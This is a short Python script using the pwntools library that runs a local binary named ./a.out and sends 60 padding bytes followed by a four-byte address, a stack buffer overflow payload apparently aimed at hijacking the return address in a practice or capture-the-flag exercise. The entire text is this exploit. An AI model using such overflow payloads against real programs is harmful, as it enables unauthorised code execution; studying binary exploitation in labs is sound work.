from pwn import *

p = process("./a.out")
p.sendline("A"*60+"\xed\x61\x55\x56")
print(p.recvline())
